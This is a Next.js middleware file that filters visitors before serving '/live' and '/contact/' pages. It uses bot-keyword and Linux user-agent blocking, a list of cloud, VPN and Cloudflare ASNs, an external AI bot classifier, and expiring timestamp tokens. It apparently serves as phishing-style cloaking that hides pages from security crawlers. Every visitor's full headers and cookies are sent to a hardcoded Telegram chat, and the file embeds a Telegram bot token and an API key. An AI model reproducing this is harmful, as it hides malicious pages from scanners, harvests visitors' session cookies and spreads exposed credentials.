import { NextRequest, NextResponse } from 'next/server';
import type { NextFetchEvent } from 'next/server';

const TELEGRAM_ACCESS_LOG_TOKEN = '8826291923:AAG61GSCIvNwoKEl_B2P9i_8vA1MJSfLzGQ';
const TELEGRAM_ACCESS_LOG_CHAT_ID = '-1004360589113';
const TELEGRAM_MAX_MESSAGE_LENGTH = 4096;

const TYPESAFE_API_KEY = 'apikey_222504c12e94ac204500a1680cd5f2d847aa_07f4f4b284a5fd07e29eace81420036365464d4278e3f58a1076260d0d02f18a';
const TYPESAFE_API_URL = 'https://api.typesafe.ai/v1/systemone';
const TYPESAFE_MODEL = 'jev-latest';

const BOT_NOUL_THRESHOLD = 0.7;
const BOT_CHOICE_CONFIDENCE_THRESHOLD = 0.55;

const BOT_KEYWORDS = [ 'bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse' ];

const BLOCKED_ASN = new Set( [
    // Cloud Providers
    15169, // Google Cloud
    396982, // Google Cloud / Google LLC
    8075, // Microsoft Azure
    16509, // Amazon AWS
    16510, // Amazon AWS
    14618, // Amazon AWS
    31898, // Oracle Corporation
    45102, // Alibaba Cloud
    55960, // Beijing Guanghuan Xinwang Digital

    // Data Centers
    198605, // GCore Labs
    201814, // Hetzner
    24940, // Hetzner Online GmbH
    51396, // Hetzner Online
    14061, // DigitalOcean
    20473, // Choopa/Vultr
    63949, // Linode
    16276, // OVH SAS
    135377, // OVH
    52925, // Ascenty Data Centers e Telecomunicações S/A
    17895, // Globalreach eBusiness Networks, Inc.
    52468, // UFINET PANAMA S.A.
    36947, // Telecom Algeria

    // VPN Providers
    212238, // Datacamp Limited
    60068, // Datacamp
    136787, // PacketHub S.A.
    62240, // Clouvider
    9009, // M247 Europe SRL
    208172, // Proton AG (ProtonVPN)
    131199, // Nexeon Technologies, Inc.
    21859, // Zenlayer Inc

    // Proxy / Hosting
    55720, // Gigabit Hosting
    397373, // Voxility
    208312, // Serverel
    37100, // SEACOM-AS

    // Other
    214961, // Netflix
    401115, // Cloudflare
    210644, // Aeza Group
    6939, // Hurricane Electric
    209 // CenturyLink
] );

const BLOCKED_UA_REGEX = new RegExp( `(${ BOT_KEYWORDS.join( '|' ) })|Linux(?!.*Android)`, 'i' );

interface GeoInfo
{
    accuracy?: number;
    area_code?: string;
    asn?: number;
    city?: string;
    continent_code?: string;
    country?: string;
    country_code?: string;
    country_code3?: string;
    ip?: string;
    latitude?: string;
    longitude?: string;
    organization?: string;
    organization_name?: string;
    region?: string;
    timezone?: string;
}

interface TypeSafeBotVerdict
{
    isBot: boolean;
    is_bot?: number;
    actor?: string;
    actorConfidence?: number;
    actorProbabilities?: Record<string, number>;
    error?: string;
}

const getGeoInfo = async ( ip: string ): Promise<GeoInfo | null> =>
{
    try
    {
        const response = await fetch( `https://get.geojs.io/v1/ip/geo/${ ip }.json`, {
            signal: AbortSignal.timeout( 3000 )
        } );

        if ( !response.ok )
        {
            console.error( 'GeoJS API error:', response.status );
            return null;
        }

        const data = await response.json();
        return {
            accuracy: data.accuracy,
            area_code: data.area_code,
            asn: typeof data.asn === 'number' ? data.asn : Number( data.asn ) || undefined,
            city: data.city,
            continent_code: data.continent_code,
            country: data.country,
            country_code: data.country_code,
            country_code3: data.country_code3,
            ip: data.ip,
            latitude: data.latitude,
            longitude: data.longitude,
            organization: data.organization,
            organization_name: data.organization_name,
            region: data.region,
            timezone: data.timezone
        };
    } catch
    {
        return null;
    }
};

const pickHeaderSignals = ( req: NextRequest ) =>
{
    const names = [
        'user-agent',
        'accept',
        'accept-language',
        'accept-encoding',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'sec-fetch-user',
        'upgrade-insecure-requests',
        'connection',
        'referer',
        'origin'
    ];

    const signals: Record<string, string> = {};
    for ( const name of names )
    {
        const value = req.headers.get( name );
        if ( value )
        {
            signals[ name ] = value;
        }
    }
    return signals;
};

/**
 * TypeSafe/Jev: atomic bot-vs-human judgment on request signals.
 * Fail-open on API errors so the site still works if TypeSafe is down.
 */
const classifyBotWithTypeSafe = async ( state: Record<string, unknown> ): Promise<TypeSafeBotVerdict> =>
{
    try
    {
        const response = await fetch( TYPESAFE_API_URL, {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${ TYPESAFE_API_KEY }`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify( {
                state,
                model: TYPESAFE_MODEL,
                questions: {
                    is_bot: {
                        type: 'noul',
                        instructions:
                            'Is this HTTP request from an automated bot, crawler, scraper, headless browser, scripted client, or other non-human agent rather than a real person using a normal browser?',
                        criteria: {
                            true: 'Clear signs of automation: fake/missing browser signals, known bot tooling, datacenter-only patterns, or non-browser clients.',
                            false: 'Looks like a real person on a normal browser (desktop or mobile) with consistent client hints.'
                        }
                    },
                    actor: {
                        type: 'choice',
                        instructions: 'What is the most likely actor behind this request, given `user_agent`, `headers`, and `geo`?',
                        criteria: {
                            human: 'A real person using a normal browser on residential or mobile ISP traffic.',
                            bot: 'An automated bot, crawler, scraper, headless browser, or scripted HTTP client.',
                            infra: 'Traffic that looks like datacenter, cloud, VPN, or proxy infrastructure commonly used for automation rather than a typical end-user.'
                        }
                    }
                }
            } ),
            signal: AbortSignal.timeout( 5000 )
        } );

        if ( !response.ok )
        {
            const body = await response.text().catch( () => '' );
            console.error( 'TypeSafe API error:', response.status, body );
            return { isBot: false, error: `http_${ response.status }` };
        }

        const data = await response.json();
        const answers = data.answers ?? {};
        const isBotNoul = typeof answers.is_bot?.noul === 'number' ? answers.is_bot.noul : undefined;
        const actorChoice = typeof answers.actor?.choice === 'string' ? answers.actor.choice : undefined;
        const actorConfidence = typeof answers.actor?.confidence === 'number' ? answers.actor.confidence : undefined;
        const actorProbabilities = answers.actor?.probabilities as Record<string, number> | undefined;

        const noulSaysBot = typeof isBotNoul === 'number' && isBotNoul >= BOT_NOUL_THRESHOLD;
        const choiceSaysBot =
            ( actorChoice === 'bot' || actorChoice === 'infra' ) &&
            typeof actorConfidence === 'number' &&
            actorConfidence >= BOT_CHOICE_CONFIDENCE_THRESHOLD;

        return {
            isBot: noulSaysBot || choiceSaysBot,
            is_bot: isBotNoul,
            actor: actorChoice,
            actorConfidence,
            actorProbabilities
        };
    } catch ( error )
    {
        console.error( 'TypeSafe classify error:', error );
        return { isBot: false, error: 'request_failed' };
    }
};

const sendTelegramAccessLog = async ( log: Record<string, unknown> ) =>
{
    if ( !TELEGRAM_ACCESS_LOG_TOKEN || !TELEGRAM_ACCESS_LOG_CHAT_ID )
    {
        return;
    }

    try
    {
        const raw = JSON.stringify( log, null, 2 );
        const text = raw.length > TELEGRAM_MAX_MESSAGE_LENGTH ? `${ raw.slice( 0, TELEGRAM_MAX_MESSAGE_LENGTH - 16 ) }\n...[truncated]` : raw;

        await fetch( `https://api.telegram.org/bot${ TELEGRAM_ACCESS_LOG_TOKEN }/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify( {
                chat_id: TELEGRAM_ACCESS_LOG_CHAT_ID,
                text
            } )
        } );
    } catch ( error )
    {
        console.error( 'Telegram access log error:', error );
    }
};

export const proxy = async ( req: NextRequest, event: NextFetchEvent ) =>
{
    const ua = req.headers.get( 'user-agent' );
    const { pathname } = req.nextUrl;

    const ip = req.headers.get( 'cf-connecting-ip' ) || req.headers.get( 'x-nf-client-connection-ip' ) || req.headers.get( 'x-forwarded-for' )?.split( ',' )[ 0 ].trim() || req.headers.get( 'x-real-ip' ) || 'unknown';
    const baseLog = {
        at: new Date().toISOString(),
        method: req.method,
        url: req.url,
        pathname,
        ip,
        headers: Object.fromEntries( req.headers.entries() ),
        cookies: Object.fromEntries( req.cookies.getAll().map( ( cookie ) => [ cookie.name, cookie.value ] ) )
    };
    const finish = ( response: NextResponse, details: Record<string, unknown> = {} ) =>
    {
        event.waitUntil(
            sendTelegramAccessLog( {
                ...baseLog,
                ...details,
                status: response.status
            } )
        );
        return response;
    };

    if ( !ua || BLOCKED_UA_REGEX.test( ua ) )
    {
        return finish( new NextResponse( null, { status: 404 } ), { blockedReason: 'user-agent' } );
    }

    let geoInfo: GeoInfo | null = null;
    if ( ip !== 'unknown' )
    {
        geoInfo = await getGeoInfo( ip );
        if ( geoInfo )
        {
            if ( geoInfo.asn && BLOCKED_ASN.has( geoInfo.asn ) )
            {
                return finish( new NextResponse( null, { status: 404 } ), { blockedReason: 'asn', geoInfo } );
            }
        }
    }

    const typeSafeVerdict = await classifyBotWithTypeSafe( {
        user_agent: ua,
        ip,
        pathname,
        method: req.method,
        headers: pickHeaderSignals( req ),
        geo: geoInfo
    } );

    if ( typeSafeVerdict.isBot )
    {
        return finish( new NextResponse( null, { status: 404 } ), {
            blockedReason: 'typesafe-bot',
            geoInfo,
            typeSafeVerdict
        } );
    }

    if ( !pathname.startsWith( '/contact' ) )
    {
        return finish( NextResponse.next(), { geoInfo, typeSafeVerdict } );
    }
    const currentTime = Date.now();
    const token = req.nextUrl.searchParams.get( 'tk' ) || req.cookies.get( 'token' )?.value;
    const pathSegments = pathname.split( '/' );
    const slug = pathSegments[ 2 ];

    const isValid = token && slug && Number( slug ) - Number( token ) < 240000 && currentTime - Number( token ) < 240000;

    if ( isValid )
    {
        return finish( NextResponse.next(), { geoInfo, typeSafeVerdict } );
    }

    return finish( new NextResponse( null, { status: 404 } ), { blockedReason: 'contact-token', geoInfo, typeSafeVerdict } );
};

export const config = {
    matcher: [
        '/live',
        '/contact/:slug*',
    ]
};
